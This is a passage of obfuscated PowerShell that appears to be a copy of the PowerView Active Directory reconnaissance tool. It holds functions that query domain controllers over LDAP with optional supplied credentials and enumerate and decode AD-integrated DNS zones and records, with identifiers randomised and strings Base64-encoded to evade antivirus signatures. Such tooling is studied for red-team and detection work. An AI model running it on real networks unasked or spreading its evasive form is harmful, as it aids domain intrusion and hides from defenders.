                ${0e64fea2836d457194968445e6b46921} = $SearchBase.ToUpper().Trim('/')
                ${13fd64d261d64452afe3fd6a08d31e4c} = ''
            }
            else {
                if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                        ${13fd64d261d64452afe3fd6a08d31e4c} = ''
                        ${0e64fea2836d457194968445e6b46921} = $SearchBase
                    }
                    else {
                        ${0e64fea2836d457194968445e6b46921} = $SearchBase.SubString(7)
                    }
                }
                else {
                    ${0e64fea2836d457194968445e6b46921} = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                ${0e64fea2836d457194968445e6b46921} = "DC=$($TargetDomain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
        }
        ${13fd64d261d64452afe3fd6a08d31e4c} += ${0e64fea2836d457194968445e6b46921}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAcwBlAGEAcgBjAGgAIABiAGEAcwBlADoAIAAkAHsAMQAzAGYAZAA2ADQAZAAyADYAMQBkADYANAA0ADUAMgBhAGYAZQAzAGYAZAA2AGEAMAA4AGQAMwAxAGUANABjAH0A')))
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            ${03f0e142a42041cd9496f2560bd34d4e} = New-Object DirectoryServices.DirectoryEntry(${13fd64d261d64452afe3fd6a08d31e4c}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            ${486dcc688c2b48a488cb68117b070ee0} = New-Object System.DirectoryServices.DirectorySearcher(${03f0e142a42041cd9496f2560bd34d4e})
        }
        else {
            ${486dcc688c2b48a488cb68117b070ee0} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${13fd64d261d64452afe3fd6a08d31e4c})
        }
        ${486dcc688c2b48a488cb68117b070ee0}.PageSize = $ResultPageSize
        ${486dcc688c2b48a488cb68117b070ee0}.SearchScope = $SearchScope
        ${486dcc688c2b48a488cb68117b070ee0}.CacheResults = $False
        ${486dcc688c2b48a488cb68117b070ee0}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            ${486dcc688c2b48a488cb68117b070ee0}.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            ${486dcc688c2b48a488cb68117b070ee0}.Tombstone = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
            ${486dcc688c2b48a488cb68117b070ee0}.filter = $LDAPFilter
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            ${486dcc688c2b48a488cb68117b070ee0}.SecurityMasks = Switch ($SecurityMasks) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { [System.DirectoryServices.SecurityMasks]::Group }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { [System.DirectoryServices.SecurityMasks]::Owner }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${cdc058d74c654552961555409917b661} = $Properties| ForEach-Object { $_.Split(',') }
            $Null = ${486dcc688c2b48a488cb68117b070ee0}.PropertiesToLoad.AddRange((${cdc058d74c654552961555409917b661}))
        }
        ${486dcc688c2b48a488cb68117b070ee0}
    }
}
function ddafb3a18c7a4a14bddba123fcbbd814 {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )
    BEGIN {
        function ba5c7a3e221c45e9a0f70394c07ad70d {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]${8f1a7d1b82c940109262c937691705d8} = $Raw[0]
            [Int]${3c26d66defd94a52a9b7feb03cef88f8} = $Raw[1]
            [Int]${a7af3c04c4164e3e9167fabd4c7e44fd} =  2
            [String]$Name  = ''
            while (${3c26d66defd94a52a9b7feb03cef88f8}-- -gt 0)
            {
                [Int]${2c75dcd94b3e4e259cfa772d06405d62} = $Raw[${a7af3c04c4164e3e9167fabd4c7e44fd}++]
                while (${2c75dcd94b3e4e259cfa772d06405d62}-- -gt 0) {
                    $Name += [Char]$Raw[${a7af3c04c4164e3e9167fabd4c7e44fd}++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        ${9f7e0a8a48d0435ebe968ad01cd05b98} = [BitConverter]::ToUInt16($DNSRecord, 2)
        ${400c214d1e09487ea879cd1dfff6e744} = [BitConverter]::ToUInt32($DNSRecord, 8)
        ${457ddb851cb34576997aa77aa5794122} = $DNSRecord[12..15]
        $Null = [array]::Reverse(${457ddb851cb34576997aa77aa5794122})
        ${7e14f2ab8ed544bdbf6b9c09b48a3ed4} = [BitConverter]::ToUInt32(${457ddb851cb34576997aa77aa5794122}, 0)
        ${87a3103e025a4de787c9291a0ce9da6a} = [BitConverter]::ToUInt32($DNSRecord, 20)
        if (${87a3103e025a4de787c9291a0ce9da6a} -ne 0) {
            ${20271181875b4b319802c30d17963fc2} = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${87a3103e025a4de787c9291a0ce9da6a})).ToString()
        }
        else {
            ${20271181875b4b319802c30d17963fc2} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        ${2172f1aff4bf4949bb9215ea60790938} = New-Object PSObject
        if (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 1) {
            ${81b20386bf7c4783a2f810ff432382b1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            ${28db47028ba44171908a3206b7e4a1e1} = ${81b20386bf7c4783a2f810ff432382b1}
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 2) {
            ${941687f219c24377b9f57b8d986db499} = ba5c7a3e221c45e9a0f70394c07ad70d $DNSRecord[24..$DNSRecord.length]
            ${28db47028ba44171908a3206b7e4a1e1} = ${941687f219c24377b9f57b8d986db499}
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 5) {
            ${238a7d0fdce049419c6561aa7b5737ff} = ba5c7a3e221c45e9a0f70394c07ad70d $DNSRecord[24..$DNSRecord.length]
            ${28db47028ba44171908a3206b7e4a1e1} = ${238a7d0fdce049419c6561aa7b5737ff}
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 6) {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 12) {
            ${d934355f2f2c45228fe8a4fe379a1919} = ba5c7a3e221c45e9a0f70394c07ad70d $DNSRecord[24..$DNSRecord.length]
            ${28db47028ba44171908a3206b7e4a1e1} = ${d934355f2f2c45228fe8a4fe379a1919}
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 13) {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 15) {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 16) {
            [string]${961bde5f70f64bf2b5182a6e1ff36eb2}  = ''
            [int]${2c75dcd94b3e4e259cfa772d06405d62} = $DNSRecord[24]
            ${a7af3c04c4164e3e9167fabd4c7e44fd} = 25
            while (${2c75dcd94b3e4e259cfa772d06405d62}-- -gt 0) {
                ${961bde5f70f64bf2b5182a6e1ff36eb2} += [char]$DNSRecord[${a7af3c04c4164e3e9167fabd4c7e44fd}++]
            }
            ${28db47028ba44171908a3206b7e4a1e1} = ${961bde5f70f64bf2b5182a6e1ff36eb2}
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 28) {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
        }
        elseif (${9f7e0a8a48d0435ebe968ad01cd05b98} -eq 33) {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
        }
        else {
            ${28db47028ba44171908a3206b7e4a1e1} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
        }
        ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) ${400c214d1e09487ea879cd1dfff6e744}
        ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) ${7e14f2ab8ed544bdbf6b9c09b48a3ed4}
        ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) ${87a3103e025a4de787c9291a0ce9da6a}
        ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) ${20271181875b4b319802c30d17963fc2}
        ${2172f1aff4bf4949bb9215ea60790938} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) ${28db47028ba44171908a3206b7e4a1e1}
        ${2172f1aff4bf4949bb9215ea60790938}
    }
}
function Get-DomainDNSZone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${f11fe58e31fe41ca86caaae9d6d37ee2} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
        if (${f11fe58e31fe41ca86caaae9d6d37ee2}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${f11fe58e31fe41ca86caaae9d6d37ee2}.FindOne()  }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${f11fe58e31fe41ca86caaae9d6d37ee2}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                ${135b3fb143bd49b987991226741987e6} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                ${135b3fb143bd49b987991226741987e6} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${135b3fb143bd49b987991226741987e6}.name
                ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                ${135b3fb143bd49b987991226741987e6}
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${f11fe58e31fe41ca86caaae9d6d37ee2}.dispose()
        }
        ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
        ${03578940a06c49d7b50664fb57fda3e1} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
        if (${03578940a06c49d7b50664fb57fda3e1}) {
            try {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${03578940a06c49d7b50664fb57fda3e1}.FindOne() }
                else { ${c1d2f3b775df48dfbe092797965c6f30} = ${03578940a06c49d7b50664fb57fda3e1}.FindAll() }
                ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                    ${135b3fb143bd49b987991226741987e6} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                    ${135b3fb143bd49b987991226741987e6} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${135b3fb143bd49b987991226741987e6}.name
                    ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                    ${135b3fb143bd49b987991226741987e6}
                }
                if (${c1d2f3b775df48dfbe092797965c6f30}) {
                    try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
            }
            ${03578940a06c49d7b50664fb57fda3e1}.dispose()
        }
    }
}
function Get-DomainDNSRecord {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${45312260293d4b76a5f1c24fd2ab6389} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
        if (${45312260293d4b76a5f1c24fd2ab6389}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${45312260293d4b76a5f1c24fd2ab6389}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${45312260293d4b76a5f1c24fd2ab6389}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                try {
                    ${135b3fb143bd49b987991226741987e6} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    ${135b3fb143bd49b987991226741987e6} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if (${135b3fb143bd49b987991226741987e6}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        ${ef62994dbf4b4879bf6bf94fda420325} = ddafb3a18c7a4a14bddba123fcbbd814 -DNSRecord ${135b3fb143bd49b987991226741987e6}.dnsrecord[0]
                    }
                    else {
                        ${ef62994dbf4b4879bf6bf94fda420325} = ddafb3a18c7a4a14bddba123fcbbd814 -DNSRecord ${135b3fb143bd49b987991226741987e6}.dnsrecord
                    }
                    if (${ef62994dbf4b4879bf6bf94fda420325}) {
                        ${ef62994dbf4b4879bf6bf94fda420325}.PSObject.Properties | ForEach-Object {
                            ${135b3fb143bd49b987991226741987e6} | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
                    ${135b3fb143bd49b987991226741987e6}
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    ${135b3fb143bd49b987991226741987e6}
                }
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${45312260293d4b76a5f1c24fd2ab6389}.dispose()
        }
    }
}
function c57d9aa48a49482b961291cafd0dde18 {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
